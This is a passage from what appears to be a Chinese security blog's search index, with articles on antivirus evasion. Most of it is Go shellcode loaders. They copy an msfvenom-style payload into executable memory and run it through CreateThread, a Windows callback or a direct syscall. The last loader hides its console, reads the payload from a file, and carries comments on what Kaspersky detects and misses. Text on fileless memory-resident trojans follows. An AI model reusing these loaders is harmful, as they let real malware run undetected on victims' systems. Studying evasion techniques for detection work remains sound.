0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,\n        0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,\n        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48,\n        0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,\n        0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,\n        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8,\n        0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,\n        0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,\n        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,\n        0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba,\n        0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd,\n        0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,\n        0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,\n        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}\n    // 3.\u7533\u8bf7\u5185\u5b58, \u8c03\u7528\u901a\u8fc7 \u51fd\u6570\u540d.Call() \u8c03\u7528\n    // \u8fd4\u56de\u4e09\u4e2a\u503c,\u7b2c\u4e00\u4e2a\u662f\u5185\u5b58\u5730\u5740\n    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)\n    // 4.\u590d\u5236sc\u5230\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\n    // &amp;sc[0],\u56e0\u4e3a\u5728go\u4e2d\u6307\u9488\u4e0d\u5b89\u5168,\u6240\u4ee5\u8981\u4f7f\u7528 unsafe.Pointer\u7c7b\u578b\n    RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;sc[0])), uintptr(len(sc)))\n    // 5.\u521b\u5efa\u7ebf\u7a0b\n    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)\n    // 6.\u7b49\u5f85\u7ebf\u7a0b\u521b\u5efa\n    WaitForSingleObject.Call(thread, 0xFFFFFFFF)\n    // 7.\u5173\u95ed DLL\n    kernel32.Release()\n}\n</code></pre> <p></p> <p>\u67e5\u770b\u5bfc\u5165\u8868</p> <p></p> <p>\u5728 Windows \u4e0a\uff0c <code>VirtualAlloc</code> \u3001<code>VirtualProtect</code>\u3001<code>CreateThread</code> \u3001 <code>WaitForSingleObject</code>\u7b49\u51fd\u6570\u90fd\u662f\u5728<code>kernel32.dll</code>\u4e2d\u5bfc\u51fa\u7684\u3002\u5bf9\u4e8e<code>RtlMoveMemory</code>\uff0c\u5b83\u662f\u5728<code>ntdll.dll</code>\u4e2d\u5bfc\u51fa\u7684\u3002\u7531\u4e8e Go \u7f16\u8bd1\u5668\u7684\u4e00\u4e9b\u9650\u5236\uff0c\u5b83\u4e0d\u80fd\u76f4\u63a5\u4ece<code>ntdll.dll</code>\u4e2d\u5bfc\u5165 <code>RtlMoveMemory</code>\uff0c\u56e0\u6b64 Go \u4f1a\u901a\u8fc7 <code>kernel32.dll</code> \u4e2d\u7684 <code>RtlMoveMemory</code>\u5c01\u88c5\u51fd\u6570\u6765\u8c03\u7528\u3002</p> <p>\u56e0\u6b64\uff0c\u5728\u751f\u6210\u7684 PE \u6587\u4ef6\u4e2d\uff0c\u53ea\u6709<code>kernel32.dll</code>\u7684\u5bfc\u51fa\u51fd\u6570\u4f1a\u5728\u5bfc\u5165\u8868\u4e2d\u76f4\u63a5\u663e\u793a\u3002\u5b9e\u9645\u4e0a\uff0c<code>RtlMoveMemory</code> \u548c\u5176\u4ed6\u51fd\u6570\u4f1a\u5728\u8fd0\u884c\u65f6\u901a\u8fc7 <code>kernel32.dll</code> \u8fdb\u884c\u95f4\u63a5\u8c03\u7528\u3002\u8fd9\u662f Go \u7f16\u8bd1\u5668\u548c\u8fd0\u884c\u65f6\u73af\u5883\u7684\u8bbe\u8ba1\u9009\u62e9.</p> <p>\u5728\u4e0a\u8ff0\u7684 Go \u4ee3\u7801\u4e2d\uff0c <code>VirtualProtect</code> \u51fd\u6570\u662f\u901a\u8fc7 <code>MustFindProc</code> \u4ece <code>kernel32.dll</code> \u4e2d\u83b7\u53d6\u7684\uff0c\u4f46\u5728\u751f\u6210\u7684 PE \u6587\u4ef6\u4e2d\u6ca1\u6709\u5728\u5bfc\u5165\u8868\u4e2d\u76f4\u63a5\u5217\u51fa <code>VirtualProtect</code> \u3002\u8fd9\u662f\u56e0\u4e3a <code>VirtualProtect</code>\u51fd\u6570\u4e5f\u662f\u5728\u8fd0\u884c\u65f6\u901a\u8fc7 <code>kernel32.dll</code> \u7684\u5c01\u88c5\u51fd\u6570\u8fdb\u884c\u95f4\u63a5\u8c03\u7528\u3002</p> <p>\u5728\u5b9e\u9645\u7684 Windows \u7cfb\u7edf\u4e2d\uff0c <code>VirtualProtect</code>\u51fd\u6570\u662f\u5728 <code>kernel32.dll</code> \u4e2d\u5bfc\u51fa\u7684\uff0c\u4f46\u662f Go \u7f16\u8bd1\u5668\u5728\u5904\u7406\u8fd9\u4e2a\u51fd\u6570\u65f6\uff0c\u53ef\u80fd\u4f1a\u91c7\u7528\u4e00\u4e9b\u7279\u6b8a\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u4f7f\u5176\u4e0d\u4f1a\u76f4\u63a5\u51fa\u73b0\u5728\u5bfc\u5165\u8868\u4e2d\u3002\u8fd9\u5e76\u4e0d\u5f71\u54cd\u7a0b\u5e8f\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u56e0\u4e3a Go \u8fd0\u884c\u65f6\u4f1a\u8d1f\u8d23\u5728\u8fd0\u884c\u65f6\u89e3\u6790\u8fd9\u4e9b\u51fd\u6570\u7684\u5730\u5740\u5e76\u8fdb\u884c\u8c03\u7528.</p>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#3go","title":"3.go\u7f16\u5199\u52a0\u8f7d\u5668","text":""},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#31","title":"3.1\u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c","text":"<pre><code>package main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nfunc main() {\n    // 1.\u52a0\u8f7dkernel32.dll,MustLoadDLL\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    // 2.\u83b7\u53d6windows api,MustFindProc\n    VirtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    RtlMoveMemory := kernel32.MustFindProc(\"RtlMoveMemory\")\n    CreateThread := kernel32.MustFindProc(\"CreateThread\")\n    WaitForSingleObject := kernel32.MustFindProc(\"WaitForSingleObject\")\n    sc := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,\n        0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48,\n        0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,\n        0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,\n        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48,\n        0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,\n        0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,\n        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8,\n        0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,\n        0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,\n        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,\n        0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba,\n        0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd,\n        0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,\n        0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,\n        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}\n    // 3.\u7533\u8bf7\u5185\u5b58, \u8c03\u7528\u901a\u8fc7 \u51fd\u6570\u540d.Call() \u8c03\u7528\n    // \u8fd4\u56de\u4e09\u4e2a\u503c,\u7b2c\u4e00\u4e2a\u662f\u5185\u5b58\u5730\u5740\n    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)\n    // 4.\u590d\u5236sc\u5230\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\n    // &amp;sc[0],\u56e0\u4e3a\u5728go\u4e2d\u6307\u9488\u4e0d\u5b89\u5168,\u6240\u4ee5\u8981\u4f7f\u7528 unsafe.Pointer\u7c7b\u578b\n    RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;sc[0])), uintptr(len(sc)))\n    // 5.\u521b\u5efa\u7ebf\u7a0b\n    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)\n    // 6.\u7b49\u5f85\u7ebf\u7a0b\u521b\u5efa\n    WaitForSingleObject.Call(thread, 0xFFFFFFFF)\n    // 7.\u5173\u95ed DLL\n    kernel32.Release()\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#32","title":"3.2\u56de\u8c03\u51fd\u6570\u8fd0\u884c","text":"<p>EnumDateFormatsA</p> <pre><code>package main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nfunc main() {\n    // 1.\u52a0\u8f7dkernel32.dll\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    //user32 := syscall.MustLoadDLL(\"user32.dll\")\n    //ntdll := syscall.MustLoadDLL(\"ntdll.dll\")\n    // 2.\u83b7\u53d6windows api\n    VirtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    RtlMoveMemory := kernel32.MustFindProc(\"RtlMoveMemory\")\n    procEnumDateFormatsA := kernel32.MustFindProc(\"EnumDateFormatsA\")\n    sc := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,\n        0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48,\n        0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,\n        0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,\n        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48,\n        0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,\n        0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,\n        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8,\n        0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,\n        0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,\n        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,\n        0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba,\n        0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd,\n        0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,\n        0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,\n        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00} // 3.\u7533\u8bf7\u5185\u5b58, \u8c03\u7528\u901a\u8fc7 \u51fd\u6570\u540d.Call() \u8c03\u7528\n    // \u8fd4\u56de\u4e09\u4e2a\u503c,\u7b2c\u4e00\u4e2a\u662f\u5185\u5b58\u5730\u5740\n    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)\n    // 4.\u590d\u5236sc\u5230\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\n    // &amp;sc[0],\u56e0\u4e3a\u5728go\u4e2d\u6307\u9488\u4e0d\u5b89\u5168,\u6240\u4ee5\u8981\u4f7f\u7528 unsafe.Pointer\u7c7b\u578b\n    RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;sc[0])), uintptr(len(sc)))\n    // 5.\u56de\u8c03\u51fd\u6570\u8c03\u7528\n    procEnumDateFormatsA.Call(addr, 0, 0)\n    // 7.\u5173\u95ed DLL\n    kernel32.Release()\n}\n</code></pre> <p>\u5176\u4ed6\u56de\u8c03\u51fd\u6570</p> <pre><code>https://learn.microsoft.com/zh-cn/windows/win32/api/winnls/#callback-functions\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#33","title":"3.3\u7cfb\u7edf\u8c03\u7528\u8fd0\u884c","text":"<pre><code>package main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nfunc main() {\n    // 1.\u52a0\u8f7dkernel32.dll\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    //user32 := syscall.MustLoadDLL(\"user32.dll\")\n    //ntdll := syscall.MustLoadDLL(\"ntdll.dll\")\n    // 2.\u83b7\u53d6windows api\n    VirtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    RtlMoveMemory := kernel32.MustFindProc(\"RtlMoveMemory\")\n    sc := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,\n        0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48,\n        0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,\n        0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,\n        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48,\n        0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,\n        0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,\n        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8,\n        0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,\n        0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,\n        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,\n        0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01,\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba,\n        0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd,\n        0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,\n        0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,\n        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00} // 3.\u7533\u8bf7\u5185\u5b58, \u8c03\u7528\u901a\u8fc7 \u51fd\u6570\u540d.Call() \u8c03\u7528\n    // \u8fd4\u56de\u4e09\u4e2a\u503c,\u7b2c\u4e00\u4e2a\u662f\u5185\u5b58\u5730\u5740\n    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)\n    // 4.\u590d\u5236sc\u5230\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\n    // &amp;sc[0],\u56e0\u4e3a\u5728go\u4e2d\u6307\u9488\u4e0d\u5b89\u5168,\u6240\u4ee5\u8981\u4f7f\u7528 unsafe.Pointer\u7c7b\u578b\n    RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;sc[0])), uintptr(len(sc)))\n    // 5.\u56de\u8c03\u51fd\u6570\u8c03\u7528\n    syscall.Syscall(addr, 0, 0, 0, 0)\n    // 7.\u5173\u95ed DLL\n    kernel32.Release()\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#4x","title":"4.x\u6b65\u5168\u7eff\u52a0\u8f7d\u5668","text":"<p>\u9ed8\u8ba4\u7248\u672c</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"github.com/gonutz/ide/w32\"\n    \"os\"\n    \"syscall\"\n    \"unsafe\"\n)\n\n// \u8fd9\u90e8\u5206\u6ca1\u95ee\u9898\nfunc closeWindows(commandShow uintptr) { // \u5361\u5df4\u65af\u57fa\u5e76\u4e0d\u67e5\u6740\u8fd9\u4e2a\n    console := w32.GetConsoleWindow()\n    if console != 0 {\n        _, consoleProcID := w32.GetWindowThreadProcessId(console)\n        if w32.GetCurrentProcessId() == consoleProcID {\n            w32.ShowWindowAsync(console, commandShow)\n        }\n    }\n}\nfunc main() {\n    // \u8fd9\u90e8\u5206\u6ca1\u95ee\u9898\n    closeWindows(w32.SW_HIDE)\n    byteSlice, err := os.ReadFile(\"config.ini\")\n    if err != nil {\n        fmt.Println(\"config file is not exist\")\n        return\n    }\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    RtlCopyMemory := kernel32.MustFindProc(\"RtlCopyMemory\")\n    VirtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000, 0x40) // \u5361\u5df4\u65af\u57fa\u67e5\u6740 0x1000|0x2000 \u7684\u5185\u5b58\u7533\u8bf7\n    RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;byteSlice[0])), uintptr(len(byteSlice)))\n    syscall.Syscall(addr, 0, 0, 0, 0)\n}\n</code></pre> <p>\u7f16\u8bd1\u547d\u4ee4</p> <pre><code>go build -o main.exe -ldflags=\"-w -s\" -trimpath main.go\n</code></pre> <p></p> <p>\u5168\u7eff\u7248\u672c</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"github.com/gonutz/ide/w32\"\n    _ \"github.com/spf13/cobra\"\n    \"os\"\n    \"syscall\"\n    \"unsafe\"\n)\n\n// \u8fd9\u90e8\u5206\u6ca1\u95ee\u9898\nfunc closeWindows(commandShow uintptr) { // \u5361\u5df4\u65af\u57fa\u5e76\u4e0d\u67e5\u6740\u8fd9\u4e2a\n    console := w32.GetConsoleWindow()\n    if console != 0 {\n        _, consoleProcID := w32.GetWindowThreadProcessId(console)\n        if w32.GetCurrentProcessId() == consoleProcID {\n            w32.ShowWindowAsync(console, commandShow)\n        }\n    }\n}\nfunc main() {\n    // \u8fd9\u90e8\u5206\u6ca1\u95ee\u9898\n    closeWindows(w32.SW_HIDE)\n    byteSlice, err := os.ReadFile(\"config.ini\")\n    if err != nil {\n        fmt.Println(\"config file is not exist\")\n        return\n    }\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    RtlCopyMemory := kernel32.MustFindProc(\"RtlCopyMemory\")\n    VirtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000, 0x40) // \u5361\u5df4\u65af\u57fa\u67e5\u6740 0x1000|0x2000 \u7684\u5185\u5b58\u7533\u8bf7\n    RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;byteSlice[0])), uintptr(len(byteSlice)))\n    syscall.Syscall(addr, 0, 0, 0, 0)\n}\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html","title":"\u4ec0\u4e48\u662fshellcode","text":"<p>\u8fd9\u4e00\u5927\u5806\u53cd\u659c\u6760\u52a0\u6570\u5b57\u662f\u4e00\u4e32msfvenom\u751f\u6210\u7684shellcode,\u4f8b\u5982\\x55\u4ee3\u8868\u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\uff0c\u5b83\u4f1a\u88ab\u7ffb\u8bd1\u6210\u6c47\u7f16\u8bed\u8a00\uff0c</p> <p>\u4f8b\u5982\uff1a</p> <p></p> <p>\u8fd9\u91cc55\u88ab\u7ffb\u8bd1\u6210\u4e86push ebp</p> <p>55\u8fd92\u4e2a16\u8fdb\u5236\u8f6c\u6362\u62108\u4f4d\u4e8c\u8fdb\u5236\uff0c\u7136\u540e\u544a\u8bc9CPU\u6267\u884c\uff0cCPU\u8bc6\u522b\u53d1\u73b0\u662f\u4ee3\u7801\u5c31\u4f1a\u6267\u884cpush ebp</p> <p>\u5728 x86 \u6c47\u7f16\u8bed\u8a00\u4e2d\uff0c\u6307\u4ee4 push ebp \u7528\u4e8e\u5c06\u57fa\u6307\u9488\u5bc4\u5b58\u5668\uff08EBP\uff09\u7684\u503c\u538b\u5165\u5806\u6808\u3002\u6bcf\u6761\u6c47\u7f16\u6307\u4ee4\u90fd\u6709\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff08\u5341\u516d\u8fdb\u5236\u7f16\u7801\uff09\u3002</p> <p>\u5bf9\u4e8e push ebp \u6307\u4ee4\uff0c\u5176\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff08\u5341\u516d\u8fdb\u5236\u7f16\u7801\uff09\u662f 0x55\u3002</p> <p>\u6240\u4ee5\uff0cpush ebp \u5bf9\u5e94\u7684\u5341\u516d\u8fdb\u5236\u6570\u662f 0x55\u3002</p>"},{"location":"CTF/Antimalware_evasion/Article1/index.html#_1","title":"\u65e0\u6587\u4ef6\uff08\u5185\u5b58\u9a6c\uff09\u548c\u6709\u6587\u4ef6","text":"<p>\u4e0a\u9762\u5229\u7528msfvenom\u751f\u6210\u7684shellcode\uff0c\u88ab\u7ffb\u8bd1\u6210\u6c47\u7f16\u8bed\u8a00\u540e\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u5185\u5b58\u4e2d\u8fd0\u884c.</p> <p>\u53ef\u4ee5\u76f4\u63a5\u5728\u5185\u5b58\u4e2d\u8fd0\u884c\uff0c\u4e0d\u4f9d\u8d56\u786c\u76d8\u6587\u4ef6\u8fd0\u884c\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u65e0\u6587\u4ef6\u8fd0\u884c.</p> <p>\u6bd4\u5982\u4e0a\u9762\u751f\u6210\u7684shellcode\u5728\u6210\u529f\u8fd0\u884c\u540e\uff0c\u6211\u4eec\u5728\u540e\u7eed\u5229\u7528\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u505a\u8fdb\u7a0b\u8fc1\u79fb\uff0c\u78c1\u76d8\u6587\u4ef6\u53ea\u662f\u8d77\u5230\u4e86\u4e00\u4e2a\u89e6\u53d1\u4f5c\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u8fd9\u4e00\u6bb5shellcode\u8fc1\u79fb\u5230\u5176\u4ed6\u8fdb\u7a0b\u4e0a\uff0c\u6b64\u65f6\u89e6\u53d1\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u5220\u9664\uff0c\u4e0d\u4f1a\u5bf9\u6728\u9a6c\u8fdb\u7a0b\u9020\u6210\u5f71\u54cd\uff0c\u9664\u975e\u5173\u673a\uff0c\u5173\u673a\u4f1a\u6e05\u7406\u5185\u5b58(\u65e0\u6587\u4ef6\uff01=\u8fdb\u7a0b\u8fc1\u79fb)</p> <p>\u4f8b\u5982\u901a\u8fc7\u5229\u7528java\u6f0f\u6d1e\u6216\u8005apache,tomcat\u7684\u6f0f\u6d1e\u5199\u5165\u7684\u5185\u5b58\u9a6c</p> 